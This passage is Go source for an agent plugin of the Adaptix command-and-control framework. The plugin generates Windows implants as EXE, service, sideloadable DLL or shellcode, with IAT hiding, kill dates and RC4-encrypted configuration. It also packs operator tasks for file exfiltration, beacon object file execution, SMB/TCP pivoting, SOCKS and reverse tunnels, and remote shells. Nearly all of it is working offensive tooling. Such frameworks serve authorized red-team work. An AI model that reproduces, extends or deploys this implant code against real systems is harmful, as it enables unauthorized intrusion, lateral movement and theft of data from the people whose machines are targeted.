package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand/v2"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2/v2"
)

type PluginAgent struct {
}

var (
	Ts             adaptix.Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(adaptix.Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) AgentRestore(agentData adaptix.AgentData) adaptix.AgentFunctions {
	return adaptix.AgentFunctions{
		CreateCommand: CreateCommand,
		ProcessData:   ProcessData,
		Encrypt:       Encrypt,
		Decrypt:       Decrypt,
		PackTasks:     PackTasks,
		PivotPackData: PivotPackData,
		TunnelCB: adaptix.TunnelCallbacks{
			ConnectTCP: TunnelMessageConnectTCP,
			ConnectUDP: TunnelMessageConnectUDP,
			WriteTCP:   TunnelMessageWriteTCP,
			WriteUDP:   TunnelMessageWriteUDP,
			Pause:      TunnelMessagePause,
			Resume:     TunnelMessageResume,
			Close:      TunnelMessageClose,
			Reverse:    TunnelMessageReverse,
			BindTCP:    TunnelMessageBindTCP,
		},
		TerminalCB: adaptix.TerminalCallbacks{
			Start: TerminalMessageStart,
			Write: TerminalMessageWrite,
			Close: TerminalMessageClose,
		},
	}
}

func (p *PluginAgent) Call(operator string, agentId int64, function string, args string) {
	_ = operator
	_ = agentId
	_ = function
	_ = args
}

/// TUNNEL

func TunnelMessageConnectTCP(channelId int64, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_TCP, int(uint32(channelId)), tunnelType, address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

func TunnelMessageConnectUDP(channelId int64, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_UDP, int(uint32(channelId)), address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

func TunnelMessageWriteTCP(channelId int64, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, int(uint32(channelId)), len(data), data}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_DATA)
}

func TunnelMessageWriteUDP(channelId int64, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, int(uint32(channelId)), len(data), data}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_DATA)
}

func TunnelMessagePause(channelId int64) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_PAUSE, int(uint32(channelId))}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

func TunnelMessageResume(channelId int64) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_RESUME, int(uint32(channelId))}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

func TunnelMessageClose(channelId int64) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_CLOSE, int(uint32(channelId))}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CLOSE)
}

func TunnelMessageReverse(tunnelId int64, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_REVERSE, int(uint32(tunnelId)), port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

func TunnelMessageBindTCP(channelId int64, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_TCP, int(uint32(channelId)), adaptix.TUNNEL_TYPE_SOCKS_BIND, address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

/// TERMINAL

func TerminalMessageStart(terminalId int64, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	programArgs := Ts.TsConvertUTF8toCp(program, oemCP)
	array := []interface{}{COMMAND_SHELL_START, int(uint32(terminalId)), programArgs}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
}

func TerminalMessageWrite(terminalId int64, oemCP int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	dataEncode := Ts.TsConvertUTF8toCp(string(data), oemCP)
	if oemCP > 0 {
		dataEncode = strings.ReplaceAll(dataEncode, "\n", "\r\n")
	}
	array := []interface{}{COMMAND_SHELL_WRITE, int(uint32(terminalId)), len(dataEncode), []byte(dataEncode)}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_DATA)
}

func TerminalMessageClose(terminalId int64) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_JOBS_KILL, int(uint32(terminalId))}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return adaptix.MakeProxyTask(packData, PRIORITY_TUNNEL_CLOSE)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os                 string `json:"os"`
	Arch               string `json:"arch"`
	Format             string `json:"format"`
	Sleep              string `json:"sleep"`
	Jitter             int    `json:"jitter"`
	SvcName            string `json:"svcname"`
	IsKillDate         bool   `json:"is_killdate"`
	Killdate           string `json:"kill_date"`
	Killtime           string `json:"kill_time"`
	IsWorkingTime      bool   `json:"is_workingtime"`
	StartTime          string `json:"start_time"`
	EndTime            string `json:"end_time"`
	IatHiding          bool   `json:"iat_hiding"`
	IsSideloading      bool   `json:"is_sideloading"`
	SideloadingContent string `json:"sideloading_content"`
	DnsResolvers       string `json:"dns_resolvers"`
	DohResolvers       string `json:"doh_resolvers"`
	DnsMode            string `json:"dns_mode"`
	UserAgent          string `json:"user_agent"`
	UseProxy           bool   `json:"use_proxy"`
	ProxyType          string `json:"proxy_type"`
	ProxyHost          string `json:"proxy_host"`
	ProxyPort          int    `json:"proxy_port"`
	ProxyUsername      string `json:"proxy_username"`
	ProxyPassword      string `json:"proxy_password"`
	RotationMode       string `json:"rotation_mode"`
}

var (
	ObjectDir_http = "objects_http"
	ObjectDir_smb  = "objects_smb"
	ObjectDir_tcp  = "objects_tcp"
	ObjectDir_dns  = "objects_dns"
	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
	LFlags         = "-Os -s -Wl,-s,--gc-sections -static -mwindows"
)

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		/// START CODE HERE

		var (
			generateConfig GenerateConfig
			params         []interface{}
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		kill_date := 0
		if generateConfig.IsKillDate {
			dt := generateConfig.Killdate + " " + generateConfig.Killtime
			t, err := time.Parse("02.01.2006 15:04:05", dt)
			if err != nil {
				err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
				return nil, err
			}
			kill_date = int(t.Unix())
		}

		working_time := 0
		if generateConfig.IsWorkingTime {
			t := generateConfig.StartTime + "-" + generateConfig.EndTime
			working_time, err = parseStringToWorkingTime(t)
			if err != nil {
				return nil, err
			}
		}

		sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
		if err != nil {
			return nil, err
		}

		lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)

		encrypt_key, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}

		params = append(params, int(agentWatermark))
		params = append(params, kill_date)
		params = append(params, working_time)
		params = append(params, sleepSeconds)
		params = append(params, generateConfig.Jitter)
		params = append(params, int(lWatermark))

		protocol, _ := listenerMap["protocol"].(string)
		switch protocol {

		case "http":

			HttpMethod, _ := listenerMap["http_method"].(string)
			Ssl, _ := listenerMap["ssl"].(bool)
			ParameterName, _ := listenerMap["hb_header"].(string)
			RequestHeaders, _ := listenerMap["request_headers"].(string)

			Hosts, Ports, err := parseCallbackAddresses(listenerMap["callback_addresses"])
			if err != nil {
				return nil, err
			}
			c2Count := len(Hosts)
			if c2Count == 0 {
				return nil, errors.New("callback_addresses: need at least one host:port")
			}
			if c2Count > 64 {
				return nil, errors.New("callback_addresses: too many entries (max 64)")
			}

			Uris := parseStringList(listenerMap["uri"])
			UserAgents := parseStringList(listenerMap["user_agent"])
			HostHeaders := parseStringList(listenerMap["host_header"])

			WebPageOutput, _ := listenerMap["page-payload"].(string)
			ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
			if ansOffset1 < 0 {
				return nil, errors.New("page-payload missing <<<PAYLOAD_DATA>>> marker")
			}
			ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])

			rotationMode := 0 // 0=sequential, 1=random
			if generateConfig.RotationMode == "random" {
				rotationMode = 1
			}

			params = append(params, Ssl)
			params = append(params, c2Count)
			for i := 0; i < c2Count; i++ {
				params = append(params, Hosts[i])
				params = append(params, Ports[i])
			}
			params = append(params, HttpMethod)
			params = append(params, len(Uris))
			for _, u := range Uris {
				params = append(params, u)
			}
			params = append(params, ParameterName)
			params = append(params, len(UserAgents))
			for _, ua := range UserAgents {
				params = append(params, ua)
			}
			params = append(params, RequestHeaders)
			params = append(params, ansOffset1)
			params = append(params, ansOffset2)
			params = append(params, len(HostHeaders))
			for _, hh := range HostHeaders {
				params = append(params, hh)
			}
			params = append(params, rotationMode)
			proxyType := 0 // 0=none, 1=http, 2=https
			if generateConfig.UseProxy {
				if generateConfig.ProxyType == "https" {
					proxyType = 2
				} else {
					proxyType = 1 // default to http
				}
			}
			params = append(params, proxyType)
			params = append(params, generateConfig.ProxyHost)
			params = append(params, int(generateConfig.ProxyPort))
			params = append(params, generateConfig.ProxyUsername)
			params = append(params, generateConfig.ProxyPassword)

		case "bind_smb":

			pipename, _ := listenerMap["pipename"].(string)
			pipename = "\\\\.\\pipe\\" + pipename

			params = append(params, pipename)

		case "bind_tcp":
			prepend, _ := listenerMap["prepend_data"].(string)
			port, _ := listenerMap["port_bind"].(float64)

			params = append(params, prepend)
			params = append(params, int(port))

		case "dns":
			userAgent := generateConfig.UserAgent
			if userAgent == "" {
				userAgent = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"
			}
			params, err = buildDNSProfileParams(params, generateConfig, listenerMap, userAgent)
			if err != nil {
				return nil, err
			}

		default:
			return nil, errors.New("protocol unknown")
		}

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}

		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile, err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}

		profileString := ""
		for _, b := range packedProfile {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		fmt.Println(profileString)
		agentProfiles = append(agentProfiles, []byte(profileString))

		/// END CODE HERE
	}
	return agentProfiles, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	/// START CODE HERE

	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("only one listener profile is supported")
	}
	listenerProfile := profile.ListenerProfiles[0].Profile
	agentProfile := agentProfiles[0]

	var listenerMap map[string]any
	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
		return nil, "", err
	}

	var (
		generateConfig GenerateConfig
		ConnectorFile  string
		ObjectDir      string
		Compiler       string
		Ext            string
		stubPath       string
		buildPath      string
		cmdConfig      string
	)

	cFlags := CFlags
	lFlags := LFlags
	postLibs := ""

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	// IAT Hiding: -nostdlib eliminates CRT, custom crt.cpp provides replacements
	if generateConfig.IatHiding {
		cFlags += " -DIAT_HIDING"
		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	protocol, _ := listenerMap["protocol"].(string)
	if protocol == "http" {
		ObjectDir = ObjectDir_http
		ConnectorFile = "ConnectorHTTP"
	} else if protocol == "bind_smb" {
		ObjectDir = ObjectDir_smb
		ConnectorFile = "ConnectorSMB"
	} else if protocol == "bind_tcp" {
		ObjectDir = ObjectDir_tcp
		ConnectorFile = "ConnectorTCP"
	} else if protocol == "dns" {
		ObjectDir = ObjectDir_dns
		ConnectorFile = "ConnectorDNS"
	} else {
		return nil, "", errors.New("protocol unknown")
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))

	if generateConfig.Arch == "x86" {
		Compiler = "i686-w64-mingw32-g++"
		Ext = ".x86.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
		Filename = "agent.x86"
	} else {
		Compiler = "x86_64-w64-mingw32-g++"
		Ext = ".x64.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
		Filename = "agent.x64"
	}

	svcName := ""
	for _, char := range generateConfig.SvcName {
		svcName += fmt.Sprintf("\\x%02x", char)
	}

	agentProfileSize := len(agentProfile) / 4
	if generateConfig.Format == "Service Exe" {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DBUILD_SVC -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, svcName, string(agentProfile), agentProfileSize, tempDir)
	} else {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")

	var buildArgsConfig []string
	buildArgsConfig = append(buildArgsConfig, "-c", cmdConfig)
	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, nil, "sh", buildArgsConfig...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")

	Files := tempDir + "/config.o "
	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
	for _, ofile := range ObjectFiles {
		Files += ObjectDir + "/" + ofile + Ext + " "
	}
	if protocol == "dns" {
		Files = appendDNSObjectFiles(Files, ObjectDir, Ext)
	}

	if generateConfig.Format == "Exe" {
		Files += ObjectDir + "/main" + Ext
		buildPath = tempDir + "/file.exe"
		Filename += ".exe"
		if generateConfig.IatHiding {
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_WinMain@16"
			} else {
				lFlags += " -Wl,-e,WinMain"
			}
		}
	} else if generateConfig.Format == "Service Exe" {
		Files += ObjectDir + "/main_service" + Ext
		buildPath = tempDir + "/svc.exe"
		Filename = "svc_" + Filename + ".exe"
		if generateConfig.IatHiding {
			postLibs += " -ladvapi32"
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_main"
			} else {
				lFlags += " -Wl,-e,main"
			}
		}
	} else if generateConfig.Format == "DLL" {
		Files += ObjectDir + "/main_dll" + Ext
		lFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".dll"
		if generateConfig.IatHiding {
			postLibs += " -lkernel32"
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_DllMain@12"
			} else {
				lFlags += " -Wl,-e,DllMain"
			}
		}
		if generateConfig.IsSideloading {
			sideloadingContent, err := base64.StdEncoding.DecodeString(generateConfig.SideloadingContent)
			if err != nil {
				return nil, "", errors.New("unknown sideloading DLL format")
			}
			defPath, err := CreateDefinitionFile(sideloadingContent, tempDir, generateConfig.Arch)
			if err != nil {
				return nil, "", err
			}
			lFlags += " " + defPath
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Sideloading: place the generated DLL in the application directory; original DLL stays in System32")
		}
	} else if generateConfig.Format == "Shellcode" {
		Files += ObjectDir + "/main_shellcode" + Ext
		lFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".bin"
		if generateConfig.IatHiding {
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_DllMain@12"
			} else {
				lFlags += " -Wl,-e,DllMain"
			}
		}
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown file format")
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")

	var buildArgs []string
	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
	buildArgs = append(buildArgs, strings.Fields(Files)...)
	if postLibs != "" {
		buildArgs = append(buildArgs, strings.Fields(postLibs)...)
	}
	buildArgs = append(buildArgs, "-o", buildPath)

	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, nil, Compiler, buildArgs...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	buildContent, err := os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)

	if generateConfig.Format == "Shellcode" {
		stubContent, err := os.ReadFile(stubPath)
		if err != nil {
			return nil, "", err
		}
		Payload = append(stubContent, buildContent...)
	} else {
		Payload = buildContent
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))

	/// END CODE HERE

	return Payload, Filename, nil
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.AgentFunctions, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agentData, adaptix.AgentFunctions{}, errors.New("error agentData data")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agentData.SessionKey = packer.ParseBytes()
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)

	/// END CODE

	return agentData, p.AgentRestore(agentData), nil
}

// Extender methods

func Encrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return RC4Crypt(data, key)
	/// END CODE
}

func Decrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return RC4Crypt(data, key)
	/// END CODE
}

func PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {

	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasks {
		array = append(array, taskData.Data)
		array = append(array, int(taskData.TaskId))
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error = nil
	)

	/// START CODE HERE

	id, _ := strconv.ParseInt(pivotId, 16, 64)
	array := []interface{}{COMMAND_PIVOT_EXEC, int(id), len(data), data}
	packData, _ = PackArray(array)

	/// END CODE

	taskData := adaptix.TaskData{
		TaskId: int64(rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var array []interface{}

	switch command {

	case "cat":
		var path string
		path, err = adaptix.GetStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cd":
		var path string
		path, err = adaptix.GetStringArg(args, "path")
		if err != nil {
			goto RET
		}

		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cp":
		var src string
		var dst string
		src, err = adaptix.GetStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = adaptix.GetStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_COPY, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "disks":
		array = []interface{}{COMMAND_DISKS}

	case "download":
		var path string
		path, err = adaptix.GetStringArg(args, "file")
		if err != nil {
			goto RET
		}
		fileId := Ts.TsFileGenID()
		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP), int(fileId)}

	case "execute":
		if subcommand == "bof" {
			var bofFile string
			var bofContent []byte
			var params []byte

			taskData.Type = adaptix.TASK_TYPE_JOB

			async := adaptix.GetBoolArg(args, "-a")
			bofFile, err = adaptix.GetStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
					params = append(params, 0)
				}
			}

			array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exfil":
		var fid string
		var fileId int64

		fid, err = adaptix.GetStringArg(args, "file_id")
		if err != nil {
			goto RET
		}
		fileId, err = strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, adaptix.TRANSFER_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, adaptix.TRANSFER_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, adaptix.TRANSFER_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "getuid":
		array = []interface{}{COMMAND_GETUID}

	case "jobs":
		if subcommand == "list" {
			array = []interface{}{COMMAND_JOB_LIST}

		} else if subcommand == "kill" {
			var job string
			var jobId int64

			job, err = adaptix.GetStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			jobId, err = strconv.ParseInt(job, 16, 64)
			if err != nil {
				goto RET
			}

			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "link":
		if subcommand == "smb" {
			var target string
			var pipename string
			target, err = adaptix.GetStringArg(args, "target")
			if err != nil {
				goto RET
			}
			pipename, err = adaptix.GetStringArg(args, "pipename")
			if err != nil {
				goto RET
			}
			pipe := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)

			array = []interface{}{COMMAND_LINK, 1, pipe}

		} else if subcommand == "tcp" {
			var target string
			var port float64
			target, err = adaptix.GetStringArg(args, "target")
			if err != nil {
				goto RET
			}
			port, err = adaptix.GetFloatArg(args, "port")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_LINK, 2, target, int(port)}

		} else {
			err = errors.New("subcommand must be 'smb' or 'tcp'")
			goto RET
		}

	case "ls":
		var dir string
		dir, err = adaptix.GetStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}

	case "lportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		lportNumber, _ := adaptix.GetFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var lhost string
			var fhost string
			var tunnelId int64
			lhost, err = adaptix.GetStringArg(args, "lhost")
			if err != nil {
				goto RET
			}
			fhost, err = adaptix.GetStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fportNumber, _ := adaptix.GetFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			tunnelId, err = Ts.TsTunnelCreateLportfwd(agentData.Id, "", lhost, lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopLportfwd(agentData.Id, lport)

			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "mv":
		var src string
		var dst string
		src, err = adaptix.GetStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = adaptix.GetStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "mkdir":
		var path string
		path, err = adaptix.GetStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "profile":
		if subcommand == "download.chunksize" {
			var size float64
			size, err = adaptix.GetFloatArg(args, "size")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PROFILE, 2, int(size)}

		} else if subcommand == "killdate" {
			var dt string
			dt, err = adaptix.GetStringArg(args, "datetime")
			if err != nil {
				goto RET
			}

			killDate := 0
			if dt != "0" {
				var t time.Time
				t, err = time.Parse("02.01.2006 15:04:05", dt)
